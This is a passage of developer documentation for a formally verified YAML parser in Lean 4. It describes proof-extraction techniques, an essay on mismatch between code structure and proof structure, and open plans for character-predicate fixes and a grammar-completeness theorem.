show flowNesting tokens (applyNodeFinalization v_content.1 v_content.2 v_props.1
    nodeStartPos).2.pos = flowNesting tokens ps.pos from by
  rw [h_fin_pos, h_content.2.2.1, h_props_fn]
```
Lean accepts this via definitional equality between the expanded goal and the
opaque `show` target, then `rw` works because the `show`'s goal has the
un-reduced function call. This is Pattern 4b's variant of the "tactic vs kernel
reduction" gap from Pattern 4.

Sorry count: 5 → 4.

---

### Pattern 4c: Wadler-style extraction of `parseStreamLoop`

#### Problem

`parseStream` contained a `for _ in [:fuel] do` loop with 3 mutable variables
(`ps`, `docs`, `streamState`), an `Except` monad, and 3 break paths (streamEnd,
none, stuck). Lean 4's `for` desugars to `Range.forIn` → `List.forIn'` with
`ForInStep` wrappers, making direct tactic reasoning intractable.

The theorem `parseStream_doc_from_parseDocument` states: every document in the
output was produced by `parseDocument` with the same token array.

#### Solution: Extract tail-recursive `parseStreamLoop`

**Third application of the Wadler-style extraction pattern** (after
`validateNodeProps` in Pattern 4 and `parseExplicitKey` in Pattern 4a).

1. **Extracted** `parseStreamLoop` as a tail-recursive function:
   ```lean
   def parseStreamLoop (ps : ParseState) (docs : Array YamlDocument)
       (streamState : StreamState) (fuel : Nat) :
       Except ScanError (Array YamlDocument) :=
     match fuel with
     | 0 => .ok docs
     | fuel + 1 => match ps.peek? with
       | some .streamEnd => .ok docs
       | none => .ok docs
       | some tok =>
         if !streamState.validNextToken tok then .error (...)
         else let savedPos := ps.pos
           match parseDocument ps with
           | .error e => .error e
           | .ok (doc, ps') =>
             let docs := docs.push doc
             let ps := { ps' with anchors := #[], ... }
             let (consumed, ps) := ps.tryConsume .documentEnd
             ...
             if ps.pos == savedPos then .ok docs
             else parseStreamLoop ps docs streamState fuel
   ```

2. **Simplified** `parseStream` to a thin wrapper:
   ```lean
   def parseStream tokens := do
     let ps := { tokens := tokens, ... }
     let ps ← ps.expect .streamStart "STREAM-START"
     parseStreamLoop ps #[] .initial tokens.size
   ```

3. **Proved** `parseStreamLoop_docs_from_parseDocument` by induction on `fuel`:
   - Base (fuel=0): accumulator invariant holds trivially
   - Step: unfold → split on `peek?` → streamEnd/none use accumulator directly
   - `some tok`: split on validation (error→contradiction), then
     `generalize`+`cases` on `parseDocument` result (error→contradiction),
     ok→chain token preservation through `parseDocument_tokens_preserved` +
     struct update + `tryConsume_tokens`, extend accumulator with
     `Array.toList_push`, recurse via IH

4. **Wrapper proof** `parseStream_doc_from_parseDocument`: unfold `parseStream`,
   `simp [bind, Except.bind]`, split on `expect`, apply loop lemma with empty
   accumulator.

#### Key technique: `generalize`+`cases` for match through `let`

The `parseStreamLoop` body has `let savedPos := ps.pos` before the
`match parseDocument ps`. Lean 4's `split` tactic cannot see through `let`
bindings in hypotheses. Solution:

```lean
-- Clear the let binding
dsimp only [] at h_ok
-- Now generalize the match discriminant
generalize h_pd : parseDocument ps = pd_result at h_ok
cases pd_result with
| error e => simp at h_ok
| ok val =>
  obtain ⟨doc_new, ps'⟩ := val
  dsimp only [] at h_ok  -- reduce remaining lets
  ...
```

This avoids the variable-mistyping issue where `split at h_ok` + `rename_i`
would bind the wrong inaccessible names.

#### Guards

No Wadler guards were needed because all consumers of
`parseStream_doc_from_parseDocument` were already `sorry`-based — there was
no proved code to protect.

#### Verification

- Build: 322/322 ✔
- Test suite: 857 passed, 12 failed, 151 skipped (identical to pre-extraction)
- Sorry count: 3 → 2

#### Result

All algorithmic/structural theorems in the C2 chain are now proved.
The 2 remaining sorrys are genuine semantic spec gaps:
- `parseStream_output_aliases_resolve` — scanner doesn't validate alias ordering
- `parseStream_output_anchors_wellformed` — `∀ inFlow` is unsatisfiable for
  cross-context aliasing

> **Closure (2026-07-31):** both spec-gap sorries were subsequently proven —
> `parseStream_output_aliases_resolve` at
> `L4YAML/Proofs/Parser/ParserAnchorProofs.lean:215` and
> `parseStream_output_anchors_wellformed` at
> `L4YAML/Proofs/Parser/ParserWfaProofs.lean:1691`. The library has been
> sorry-free since 2026-07-04 (see Blueprint/04-capstones.md, the proof-status
> SSOT).

---

## Code-proof architecture mismatch

*(was `MISMATCH.md` — "Code/Proof Architecture Mismatch in lean4-yaml-verified"; consolidated into this file 2026-08-01, file-level history in git)*

### The Concept

In software engineering, Garlan, Allen, and Ockerbloom (1995) identified
**architecture mismatch**: when independently-developed components make
conflicting assumptions about how they will interact, composing them
into a system fails or requires costly adaptation. Their examples involved
event models, data formats, and control flow assumptions that clashed
at integration time despite each component being individually correct.

We have discovered an analogous phenomenon in **formal verification of
software**: a **code/proof architecture mismatch**. The scanner code and
the grammar specification are both internally consistent, but their
structural decomposition boundaries are incompatible — making it
impossible to prove the desired property without introducing a new
abstraction layer that bridges the gap.

We propose the term **code/proof mismatch** for this class of problem.

### How it Differs from Classical Architecture Mismatch

Classical architecture mismatch arises from composing **existing black-box
components** that were designed independently. The fix is typically an
adapter, wrapper, or glue code — a *syntactic* bridge between two APIs.

Code/proof mismatch arises when **formalizing properties of a single
system**. The code already works. The grammar specification already
defines the language. But the proof that connects them requires
decomposing both along compatible boundaries — discovering that the
natural decomposition of the code (token-by-token scanning) and the
natural decomposition of the grammar (nested document → node → content
productions) do not align.

| Aspect | Architecture Mismatch (1995) | Code/Proof Mismatch (this work) |
|--------|-----------------------------|---------------------------------|
| Domain | Component integration | Formal verification |
| Parties | Two or more independent components | Code structure vs. specification structure |
| Symptoms | Runtime failures, deadlocks, data corruption | Unprovable theorems, sorry obligations that resist discharge |
| Root cause | Incompatible assumptions about interaction protocols | Incompatible decomposition granularity between code and grammar |
| Fix | Adapters, wrappers, glue code | New proof-level abstractions that bridge the boundary gap |

The key difference: in classical architecture mismatch, you're composing
**what exists**. In code/proof mismatch, you're **discovering what
abstractions you need** to write properties and prove them. The mismatch
is not between two implementations but between an implementation's
structure and a specification's structure, as seen through the lens of
proof.

### The Specific Mismatch

#### Scanner token boundaries vs. grammar production boundaries

The YAML scanner (`scanNextToken`) processes input in **token steps**:

```
Token N                          Token N+1
┌────────────────────────────────┬────────────────────────────────┐
│ preprocessing │ content scan   │ preprocessing │ content scan   │
│ (whitespace)  │ (e.g., "[")   │ (whitespace)  │ (e.g., "a")   │
└───────────────┴────────────────┴───────────────┴────────────────┘
```

The YAML grammar (`SBlockNode.flowInBlock`) requires **three-part
productions** that span token boundaries:

```
┌──────────────────────────────────────────────────────────────────┐
│ SSeparate        │ SFlowNode content  │ SSLComments              │
│ (ws BEFORE)      │                    │ (break/ws AFTER)         │
└──────────────────┴────────────────────┴──────────────────────────┘
       ↑                                        ↑
  From token N's preprocessing            From token N+1's preprocessing
```

**The trailing `SSLComments` of token N is consumed during token N+1's
preprocessing.** This means no single token step has all three parts
available simultaneously.

#### Concrete examples of the mismatch

1. **Flow indicators** (`[`, `]`, `{`, `}`, `,`): After scanning `[`,
   the grammar position is mid-content. No `SLYamlStream` constructor
   can represent "stream with one open bracket" — the grammar requires
   the matching `]` and trailing comments before a document is complete.

2. **Document suffix** (`...`): `SLDocumentSuffix` requires
   `SCDocumentEnd + SSLComments`. After scanning `...`, we have
   `SCDocumentEnd` at column 3, but the trailing newline that would
   form `SSLComments` is not consumed until the next token's
   preprocessing.

3. **Block indicators** (`-`, `?`, `:`): Block collections like
   `- a\n- b` span ≥4 `scanNextToken` calls. There is no per-token
   grammar production for "one entry of a block sequence" — the grammar
   requires the complete `SBlockSeqEntries` as a unit.

#### Why it went undetected through 4 layers of planning

The v0.4.6 plan grew incrementally as each layer exposed new gaps:

| Phase | What was planned | What was discovered |
|-------|-----------------|-------------------|
| **Original** | 3 layers to discharge 1 sorry (`scan_content_gives_stream`) | — |
| **Layer 1** | Per-scanner-function `_prod` theorems | `n=0, c=.blockIn` existential trick needed |
| **Layer 2** | Compose scalars into `SBlockNode` hierarchy | `SBlockNode.flowInBlock` needs loop-level context (Reflection #2: "the `SSeparate` comes from preprocessing, `SSLComments` from post-content — neither is available to the content function") |
| **Layer 3** | Thread `SLYamlStream` through `scanLoop` | `SLYamlStream` is NOT an append structure (Reflection #1); `GConsumeAll`/`SSLComments` shortcuts all fail |
| **Layer 4a–b** | Leaf `_prod` theorems + preprocessing coupling | Foundations complete, no issues |
| **Layer 4c** | Per-dispatch sorry lemmas for `scanNextToken` | **Mismatch discovered**: the sorry lemmas are unprovable because `SLYamlStream sp_start sp'` requires complete grammar productions, but each token step only has partial context |

**The mismatch was foreshadowed** by Layer 2 Reflection #2 ("needs
loop-level context") and Layer 3 Reflection #1 ("`SLYamlStream` is not
an append structure"). But these were treated as complexity management
issues, not as structural impossibility. The escalation through 4a → 4b
→ 4c was driven by assuming that enough machinery would eventually close
the gap — when in fact the gap was architectural.

### Resolution: The Lagging Grammar Accumulator

The fix requires a new proof-level abstraction: a **grammar accumulator
whose position lags behind the scanner** by exactly one `SSLComments`
worth.

#### Current (broken) invariant

```
∀ token step:
  SLYamlStream sp_start sp  ∧  ScannerSurfCorr sc sp
  ────────────────────────────────────────────────────
            grammar and scanner at SAME position
```

This is unprovable because after scanning token N's content, the grammar
needs N's trailing `SSLComments` (which hasn't been consumed yet) to
close N's `SBlockNode` production.

#### Proposed (lagging) invariant

```
∀ token step:
  SLYamlStream sp_start sp_gram  ∧
  PendingNode sp_gram sp_scan    ∧   -- open grammar gap
  ScannerSurfCorr sc sp_scan
  ─────────────────────────────────
  grammar lags scanner by one SSLComments
```

At each step:
1. **Preprocessing** of token N+1 consumes whitespace → this provides
   the `SSLComments` needed to **close token N's node**
2. The closed node extends `SLYamlStream` from `sp_gram` to `sp_mid`
3. **Content dispatch** of token N+1 advances scanner to `sp_scan'`
4. A new `PendingNode sp_mid sp_scan'` is opened

At EOF (preprocessing returns `none`):
- The final `PendingNode` is closed with `SSLComments` from the EOF gap
- `SLYamlStream sp_start sp_final` where `sp_final.chars = []`

#### What `PendingNode` must track

The pending grammar state between tokens must capture all information
needed to close a `SBlockNode` / `SLDocumentSuffix` / etc. once the
trailing `SSLComments` becomes available:

- **Document-level state**: do we have an open document? If so, via `---`
  (explicit) or bare? Are we between documents (after `...`)? Between
  prefix and content?
- **Node-level content**: the actual `SFlowNode`, `SCLLiteral`, etc.
  produced by the current token's `_prod` theorem
- **Separation context**: the `SSeparate` from preprocessing, needed
  by `SBlockNode` constructors
- **Block collection nesting**: for multi-token block sequences/mappings,
  the partial `GStar (SBlockSeqEntry n)` accumulated so far

This is substantially more complex than the current `SLYamlStream`-only
accumulator, but it correctly models the scanner's token-by-token
execution.

### Reflections on Code/Proof Mismatch

1. **Mismatches manifest as sorry obligations that resist discharge.**
   The 5 per-dispatch sorry lemmas in StreamAccum.lean are individually
   well-typed and appear reasonable. They only become visibly unprovable
   when you attempt the proof and realize the postcondition requires
   information that won't exist until the next iteration.

2. **Escalating machinery is a diagnostic signal.** The progression
   from "1 sorry, 3 layers" to "1 sorry, 4 layers with sublayers a–d"
   should have triggered a review of the invariants, not just addition
   of more infrastructure. In hindsight, each new sublayer was working
   around the same fundamental misalignment rather than addressing it.

3. **The grammar is not wrong; the code is not wrong.** Both the YAML
   grammar specification and the scanner implementation are correct.
   The mismatch is in the **interface between them** — the assumption
   that scanner token steps can be mapped one-to-one onto grammar
   productions. The resolution requires a new abstraction (the lagging
   accumulator) that lives entirely in the proof layer.

4. **This is not unique to YAML.** Any scanner/parser that processes
   tokens with leading and trailing context (whitespace, comments,
   separators) will have this boundary misalignment relative to a
   grammar that bundles leading/trailing context with content. The
   pattern likely applies to any verified scanner proving grammar
   conformance.

> **Closure note (2026-07-31):** the lagging-accumulator resolution described
> here was carried to completion. `L4YAML/Proofs/Production/StreamAccum.lean`
> builds sorry-free (the "5 per-dispatch sorry lemmas" of Reflection 1 were all
> discharged), and the chain now feeds the proven `@[capstone]` strictness
> theorems `scan_strict_proof` / `parse_strict_proof` in
> `L4YAML/Proofs/Production/DocumentProduction.lean` (see
> Blueprint/04-capstones.md, Group 7). The library as a whole has been
> sorry-free since 2026-07-04.

### Postscript: The Converse — When Boundaries Are Right

The resolution of the mismatch (sub-layers 4d and 4e) produced an
unexpected positive result that is worth documenting alongside the
negative lesson.

Sub-layer 4e was expected to be the **hardest part** of the entire
proof effort. Block collections (`- a\n- b`) span multiple
`scanNextToken` calls, requiring a nested accumulator to track
partially-built `SBlockSeqEntries` and `SBlockMapEntries` across
iterations. The README estimated it at "High" difficulty with "novel
inductive design."

In practice, 4e was completed quickly and mechanically. The `BlockStack`
inductive (3 constructors: `nil`, `seqLevel`, `mapLevel`) slotted into
the existing composition layer with only parameter additions. All six
proven composition theorems reproved with the same `unfold/split`
skeleton used in 4c and 4d. The sorry lemma signatures gained one extra
existential variable (`sp_block'`) and one extra hypothesis (`h_stack`).
No proof content changed.

This was possible because the 4d resolution — the lagging invariant —
had established the **right abstraction boundary**. Specifically:

1. **Orthogonal concerns compose.** The lagging invariant separated
   "immediate token lag" (`PendingNode`) from "grammar accumulation"
   (`SLYamlStream`) from "scanner correspondence" (`ScannerSurfCorr`).
   Adding a fourth concern ("block nesting depth" via `BlockStack`)
   required no restructuring — it inserted between `SLYamlStream` and
   `PendingNode` as an independent component. The four-part state
   (`SLYamlStream ∧ BlockStack ∧ PendingNode ∧ ScannerSurfCorr`)
   is a product of independent concerns, not a monolithic invariant.

2. **Evidence-free inductives are rewrite-resilient.** All three
   iterations (4c, 4d, 4e) kept the accumulator types evidence-free
   (tracking positions only, not grammar witnesses). This meant each
   rewrite only changed type signatures and existential unpacking in
   the composition layer — never proof content. The cost of adding
   `BlockStack` was proportional to the number of *type signatures*
   that mentioned position variables, not the number of *proofs*.

3. **The composition layer is structurally invariant.** The
   `unfold scanNextToken; simp only [bind, Except.bind]; split`
   pattern that decomposes `scanNextToken` into 5 dispatch paths is
   determined by the *code's* control flow, not by the *invariant's*
   structure. Changing the invariant from a triple to a quad changed
   what gets passed to each sorry lemma, but not how many sorry
   lemmas exist or how the delegation works. This is a hallmark of
   correct abstraction: the composition structure is stable under
   refinement of the components it composes.

**The lesson is the converse of the mismatch:** architecture mismatch
makes simple properties impossible to prove (the 4c sorry obligations
were provably unprovable). But once the abstraction boundaries are
correctly aligned, even the "hardest" extensions become mechanical
(4e slotted in without restructuring). The cost of finding the right
boundary (4c's failure → this essay → 4d's redesign) was high, but
the ongoing cost of working within it is low. This suggests that in
verified systems, **investing in abstraction boundary design has
superlinear returns** — a correct boundary not only resolves the
current mismatch but makes future extensions cheap.

This also provides a **diagnostic criterion**: if adding a new concern
to a proof requires restructuring existing proofs rather than extending
them, the abstraction boundary may be misaligned. Conversely, if a new
concern slots in as an independent component with only type-signature
changes to the composition layer, the boundary is likely correct.

**Later confirmation (2026-07-31):** the four-part product later grew to a
five-part quint. During the flow-indicator work (sub-layer 4z), a `FlowStack`
layer was inserted between `BlockStack` and `PendingNode`, giving the position
chain `SLYamlStream → BlockStack → FlowStack → PendingNode → ScannerSurfCorr`
(see §0b' of `L4YAML/Proofs/Production/StreamAccum.lean`). Exactly as the
diagnostic criterion predicts, it slotted in as an independent component without
restructuring the existing proofs — and after sub-layer 4z.1 it even collapsed
to the trivial `nil`-only relation, with all flow-indicator evidence carried
through `PendingNode.pendingFlow` instead. The boundary absorbed both the
addition and the subsequent simplification, strengthening the thesis.

### References

- D. Garlan, R. Allen, J. Ockerbloom. "Architectural Mismatch: Why
  Reuse Is So Hard." *IEEE Software*, 12(6):17-26, November 1995.

# The Plan (open work)

Everything unfinished across the corpus, in one place. The three
substantial items have full sections below; the remainder is collected
under [Other open items](#other-open-items). (The *active* engineering
next-steps list — indexed-twin ports of the matrix fixes, the
event-axis verification gap, the `adaptForFlowContext` inductive gap —
lives in [README.md](README.md) and is not duplicated here.)

| Item | Status | Section |
|---|---|---|
| `ns-char` predicate spec-loose body | **Fixed 2026-08-01** (predicates tightened; scanner + emitter conformant; regression-tested) | [The ns-char gap](#the-ns-char-gap) |
| Grammar completeness (`parse_iff_grammar`, capstone 7.7) | **Open** (unblocked; Step-0 audit done) | [Grammar completeness plan](#grammar-completeness-plan) |
| Merge semantics (`DuplicateKeyPolicy.merge`) | **Open** (design ready; re-base on `LawfulBEq`) | [Merge semantics plan](#merge-semantics-plan) |
| Security limits: open questions + future work | **Open** (design questions; 3 unimplemented features) | [Security hardening backlog](#security-hardening-backlog) |
| Limit-enforcement verification, and the rest | **Open** (varied) | [Other open items](#other-open-items) |

## The ns-char gap

*(was `NS-CHAR-PREDICATE-GAP.md` — "ns-char Predicate — Spec-Loose Body";
consolidated into this file 2026-08-01; **closed 2026-08-01** — the fix
landed the same day; closure record below, full plan history in git)*

**Status:** Fixed. The predicates now implement
`[34] ns-char ::= c-printable - b-char - c-byte-order-mark - s-white`
exactly; scanner, emitter, and proofs updated; regression-tested.

### What was wrong

`isNsChar` (`Surface/Basic.lean`), `isPlainSafeBool/Prop`, and
`canStartPlainScalarBool/Prop` (`Spec/CharPredicates.lean`) approximated
ns-char as `¬whitespace ∧ ¬linebreak`, admitting BOM (`U+FEFF`) and
non-printable control characters in plain scalars and anchor names
(latent since 2026-04-28; no valid YAML was affected).

### The fix

Every predicate gained `isPrintableProp c ∧ c ≠ '﻿'` (Bool mirrors:
`isPrintableBool c && c != '﻿'`). Note BOM sits inside c-printable's
`[E000, FFFD]` range, so the printability conjunct alone does **not**
exclude it — the explicit BOM conjunct is load-bearing.

The real fix surface was wider than the predicates (the original
blast-radius estimate missed all of these):

- **`canStartPlainScalarBool/Prop`** had to tighten with `isPlainSafe*`,
  or the scanner would dispatch a BOM-first plain scalar whose grammar
  derivation no longer exists (soundness would break, and the collect
  loop would stall on an empty token).
- **Scanner runtime, legacy + indexed twins**: the `':'`-adjacency check
  (`collectPlainScalar_terminates?` in `Scanner/Scalar.lean`,
  `colonTerminatesPlain` in `Scanner/IndexedScanner.lean`) gained
  `|| !isPrintableBool n || n == '﻿'` — without it, `a:<BOM>` would emit
  a trailing-`:` plain token with no `[130]` derivation. The anchor-name
  loops (`Scanner/NodeProperties.lean`, `Scanner/IndexedDispatch.lean`)
  tightened to match `[102] ns-anchor-char`. Mid-stream BOM/controls now
  fail dispatch with `unexpectedChar`; leading BOM (`[202]` document
  prefix) and BOM inside quoted scalars (`[2]` nb-json) remain valid.
- **Emitter**: `Dump.isPlainSafe` rejects non-printables/BOM (style
  falls back to double-quoted), and `Dump.escapeChar` now hex-escapes
  all non-printables (`\xXX`/`\uXXXX`/`\UXXXXXXXX`). Previously it
  emitted raw control bytes inside double quotes — invalid per nb-json
  and rejected by the scanner (`invalidControlChar`); the loose plain
  path had masked that latent emitter bug.
- **Proof sweep** (~15 files, mechanical): the scanner→grammar bridges
  (`not_blank_to_nsChar`, `colon_not_terminated_next`,
  `colonTerminatesPlain_false_iff`, `isNsAnchorChar_of_scanner_cond`,
  the `canStartPlainScalar_*` helper families in ScannerCorrectness /
  IndexedScannerProgress / ScannerPlainScalar / CharClass) gained
  printability/BOM hypotheses, fed exactly by the tightened runtime
  checks. Conjunction-arity updates rippled through ScalarProduction,
  StructureProduction, ScannerPlainContent, IndexedScalar,
  ParserGrammableBase, ScannerPlainScalarValid.

Verification: all 197 library modules + full targets green, 4391/4391
test checks, 0 sorries, 0 custom axioms, capstone pins unchanged, both
CI gates green.

Regression tests: `Tests/ScannerTests.lean` ("ns-char tightening"
category, 8 checks incl. the leading-BOM and quoted-BOM acceptance
cases) and `Tests/Guards/Dump.lean` (emitter `#guard`s incl. the
`\x01` escape round-trip).

### Companion nb-char fix (2026-08-01, same day)

`[27] nb-char` (`isNbChar`, `Surface/Basic.lean`) was tightened the
same way immediately after. Where it landed:

- **Block-scalar bodies** ([171] `l-nb-literal-text` uses
  `GPlus SNbChar`): `collectLineContentLoop`(+`Ix`) stops at
  non-printables/BOM and the block-scalar loop then *ends the scalar
  there* (the previously dead no-break recursion in
  `collectBlockScalarLoop`(+`Ix`) became a direct stop), so dispatch
  rejects the offending char with `unexpectedChar`.
- **Directive names, version digits, tag handles/prefixes**: the
  name loop tightened; digit/word/URI classes were already
  printable-ASCII subsets (bridged by the `*_ascii` helpers in
  `StructureProduction.lean`).
- **Emitter**: `Dump.blockScalarRepresentable` guards literal/folded
  emission (controls/BOM/CR force double-quoted, escaped), and the
  explicit `.singleQuoted` config now falls back to double-quoted for
  `singleQuotedRepresentable`-failing content.
- **Comments and directive trailing text are deliberately loose**:
  `SCNbCommentText` [75] and the simplified `SLDirective` [82] use the
  named predicate `isCommentTextChar` (`¬linebreak` only,
  `Surface/Basic.lean`) — comment text is stripped with no semantic
  effect, and tightening it would have forced a weakened
  stopped-at-garbage postcondition through the `skipToContent`
  identity-lemma family that scanner correctness uses before every
  token. The deviation is documented at the predicate and is **not**
  open work.

### Related spec-fidelity corrections (2026-04, unchanged)

The cleanup that found this gap also corrected:

- [110] `nb-double-text`, [119] `nb-single-text`, [131] `ns-plain` — body
  dispatch on `YamlContext` now enumerates all four spec contexts explicitly
  (key vs. non-key partition), with `blockOut`/`blockIn` grouped for totality.
- [109] `c-double-quoted` / [120] `c-single-quoted` `_ctx_lift` theorems —
  preconditions strengthened from `c ≠ .flowKey` to
  `c ≠ .blockKey ∧ c ≠ .flowKey` to match the corrected body productions.
- `isPlainSafe*` docstring — documents the spec's 4-context dispatch and
  how the `inFlow : Bool` parameter encodes the 4→2 partition
  (`FLOW-OUT/BLOCK-KEY ↦ false`, `FLOW-IN/FLOW-KEY ↦ true`); notes that
  `BLOCK-OUT/BLOCK-IN` are out-of-spec for [127].

---

## Grammar completeness plan

*(was `GRAMMAR_COMPLETENESS_PLAN.md` — "Grammar Completeness Plan — parse_iff_grammar (capstone 7.7)"; consolidated into this file 2026-08-01, file-level history in git)*

> Formerly `VERSION-0.4.8.md`; renamed 2026-08-01 (VERSION-named docs
> are retired release-campaign records — this is the **open** plan).
> The campaign, when executed, ships as release v0.4.8. All line pins
> below re-verified against the code on 2026-08-01.

**Goal:** Prove the grammar completeness theorem — that every string in the YAML 1.2.2 formal language parses successfully — and close the biconditional.

```lean
theorem parse_iff_grammar (input : String) :
    (∃ docs, parseYaml input = .ok docs) ↔ InYamlLanguage input
```

Both directions:
- **Forward** (v0.4.6, proven): `parseYaml input = .ok docs → InYamlLanguage input`
- **Converse** (this plan, target): `InYamlLanguage input → ∃ docs, parseYaml input = .ok docs`

### Status (as of 2026-08-01): NOT STARTED — UNBLOCKED

| Step | Status | Notes |
|---|---|---|
| 0. Scanner audit for directive handling | ✅ done 2026-08-01 | findings under Fix B: mid-stream leniency **confirmed reachable** |
| 1. Remove `directiveDrop` / `scannerDrop` constructors from `SLYamlStream` | ❌ open | both still present in [Surface/Document.lean](L4YAML/Surface/Document.lean) (lines 165, 175) |
| Fix A: eliminate `scannerDrop` (flow indicator grammar evidence) | ❌ open | blocking lemma `SFlowNode_context_lift` not proven |
| Fix B: eliminate `directiveDrop` (orphaned directive resolution) | ❌ open | audit done; recommended path = strengthen the scanner (option c) |
| 5. Prove the converse `grammar_completeness` | ❌ open | depends on Steps 0–4 |
| 6. Assemble `parse_iff_grammar` biconditional | ❌ open | depends on Step 5 |

**Blocker cleared (2026-07-04):** v0.4.7 is complete — `universal_roundtrip` is
fully proven (proof-status SSOT:
[Blueprint/04-capstones.md](Blueprint/04-capstones.md)). This plan is now the
only open proof frontier (capstone slot 7.7, `parse_iff_grammar`).

**Where the obligations live:** `StreamAccum.lean` is **sorry-free** — 0
`sorry` tactics; its ~28 `sorry` mentions are docstring narrative, mostly
inside the §6 Gap Analysis block now explicitly marked *historical*
(`StreamAccum.lean:3201–3320`). The obligations this plan addresses
(`SFlowNode_context_lift`, `h_closable` construction for `pendingFlow`,
orphaned-directive resolution) are real but live only as prose: in v0.4.6
they were "discharged" **via the over-approximation constructors this plan
removes**, so eliminating the constructors reopens exactly those
obligations, minus the escape hatch. (The BOM col≠0 edge case formerly
listed alongside them is genuinely closed:
`bom_noWhitespace_ssbcomment` at
[L4YAML/Proofs/Production/PreprocessProduction.lean:262](L4YAML/Proofs/Production/PreprocessProduction.lean)
builds `SSBComment.withSep` from the column-independent
`SSeparateInLine.startOfLine`.)

**Estimated effort:** ~150–600 LoC for Phase 1; the bulk lands in
[Production/StreamAccum.lean](L4YAML/Proofs/Production/StreamAccum.lean) (currently 3,322 lines).

---

### Motivation

Version 0.4.6 proved **acceptance strictness** — if the parser accepts an input, the input is in the YAML language:

```lean
theorem parse_strict_proof : parseYaml input = .ok docs → InYamlLanguage input
theorem scan_strict_proof  : scan input = .ok tokens   → InYamlLanguage input
```

The converse — that every YAML-language string is accepted — is missing. Together these would establish a **biconditional**: the parser accepts **exactly** the YAML 1.2.2 language — no more, no less. This is the strongest correctness statement possible for a parser: soundness (forward), completeness (converse), and their conjunction.

1. **Spec-conformance is bidirectional.** Without the converse, the parser could silently reject valid YAML inputs. v0.4.6 proves it doesn't accept *invalid* inputs; this plan proves it doesn't reject *valid* ones.

2. **Closes the formal verification story.** The biconditional `parse ↔ grammar` is the gold standard for parser correctness in the formal-methods literature. Combined with v0.4.7's round-trip theorem: the parser accepts exactly the right inputs, and for the emitter's output subset, the parsed result matches the original.

3. **Enables refactoring confidence.** Any scanner/parser refactor that preserves the biconditional is provably behaviour-preserving. Without completeness, a refactor could accidentally narrow the accepted language.

---

### The Over-Approximation Problem

`InYamlLanguage` is defined via `SLYamlStream`
([Surface/Document.lean:136](L4YAML/Surface/Document.lean); `InYamlLanguage`
at :186), which has **5 constructors**:

```lean
inductive SLYamlStream : SurfPos → SurfPos → Prop where
  | single           : GStar SLDocumentPrefix → GOpt SLAnyDocument → GStar SLDocumentSuffix → ...
  | suffixContinue   : SLYamlStream s s₁ → GPlus SLDocumentSuffix → ...
  | implicitContinue : SLYamlStream s s₁ → GStar SLDocumentPrefix → GOpt SLAnyDocument → ...
  | directiveDrop    : SLYamlStream s s₁ → GPlus SLDirective s₁ s' → SLYamlStream s s'
  | scannerDrop      : SLYamlStream s s₁ → SSLComments s₂ s' → SLYamlStream s s'
```

The first three correspond directly to YAML 1.2.2 §9.1 production [211]. The last two — `directiveDrop` (line 165) and `scannerDrop` (line 175) — are **over-approximations** added during the v0.4.6 `scan_strict` proof to accommodate scanner behaviour that doesn't map cleanly to spec productions:

- **`directiveDrop`**: absorbs orphaned directives (e.g., `%YAML 1.2` without a following document).
- **`scannerDrop`**: opaque gap matcher for characters consumed by the scanner (e.g., incomplete flow indicators) that don't fit a clean grammar production.

#### Consequence for the converse

The over-approximation constructors make `InYamlLanguage` **weaker** than "parseable YAML":

```
parseable inputs ⊂ InYamlLanguage inputs
```

A string can satisfy `InYamlLanguage` (via `scannerDrop`) without being parseable — e.g., an unclosed flow sequence `[1, 2` may be accepted by `InYamlLanguage` through `scannerDrop` but rejected by `parseYaml` with an unmatched-bracket error.

**The converse theorem is therefore false under the current definition.** The fix: remove the over-approximation constructors, making `InYamlLanguage` exactly characterize the parseable YAML language.

---

### Approach: Eliminate Over-Approximation Constructors

Rather than creating a parallel `StrictInYamlLanguage` definition, we **remove `directiveDrop` and `scannerDrop` directly from `SLYamlStream`**, reducing it to its 3 spec-conforming constructors:

- No duplication of grammar definitions
- The existing `InYamlLanguage` becomes the biconditional target
- Every existing theorem using `InYamlLanguage` is automatically strengthened
- `scan_strict_proof` is *harder* to prove (no escape hatches), but the theorem itself is *stronger*

#### Impact analysis (verified 2026-08-01)

- **Definition site (must change):** `L4YAML/Surface/Document.lean` — remove the two constructors from the `SLYamlStream` inductive.
- **Construction sites (must fix):** all 8 are in `Proofs/Production/StreamAccum.lean` — 1 `scannerDrop` (line 481) + 7 `directiveDrop` (lines 505, 1138, 1162, 1334, 1346, 2794, 2814).
- **Nothing else breaks:** a library-wide sweep found **no case analysis on `SLYamlStream` anywhere** — not even in `StreamAccum.lean`, which only *constructs* it. `DocumentProduction.lean` applies the three spec constructors in helper lemmas and threads values opaquely; every other file threads existentials. Removing constructors therefore breaks exactly the 8 construction sites.
- Corollary for Step 5: the converse proof will introduce the library's **first** case analysis (rule inversion) of `SLYamlStream`.

---

### Dependency Map

#### Usage site 1: `PendingNode.close_with_ssl` — `scannerDrop` (line 481)

The `pendingFlow` arm uses `scannerDrop`:

```lean
| pendingFlow =>
    exact SLYamlStream.scannerDrop sp_start sp_block sp_scan sp_mid h_stream h_ssl
```

**Root cause**: `PendingNode.pendingFlow` (`StreamAccum.lean:134–136`) stores only `h_stream : SLYamlStream sp_start sp_block` — there is an opaque gap `sp_block → sp_scan` where flow indicators (`[`, `{`, `]`, `}`, `,`) were scanned, with no grammar evidence retained.

**Fix required**: `pendingFlow` must carry grammar evidence for the gap — see Fix A.

#### Usage site 2: `PendingNode.close_with_ssl` — `directiveDrop` (line 505)

The `pendingDirective` arm uses `directiveDrop`:

```lean
| @pendingDirective _ h_dir_acc _ _ =>
    exact SLYamlStream.directiveDrop sp_start sp_block sp_mid
      h_stream (h_dir_acc sp_mid h_ssl)
```

**Root cause**: when directives are encountered without a following `---`, the scanner accumulates them but they never form a document; `directiveDrop` absorbs them. (`pendingDirective`'s own docstring, `StreamAccum.lean:120–122`: "Does NOT carry h_closable — cannot close directives without `---`".)

**Fix required**: see Fix B.

#### Usage sites 3–8: `accum_structural_pending` / `accum_step_structural` / `accum_step_block`

All `pendingDirective` transition cases use `directiveDrop`, in the same pattern, **6 times** across 3 lemmas (`accum_structural_pending` lines 1138/1162, `accum_step_structural` lines 1334/1346, `accum_step_block` lines 2794/2814) — always the `pendingDirective` case, in both col=0 and col≠0 sub-cases.

Note: these sites construct `directiveDrop` **directly**, not via `close_with_ssl` — but the fix is shared: once the directive-without-`---` case is resolved, the same construction replaces `directiveDrop` at all 7 sites.

#### Summary: two independent fixes

| Fix | Constructor | Usage sites | Root cause |
|-----|-------------|-------------|------------|
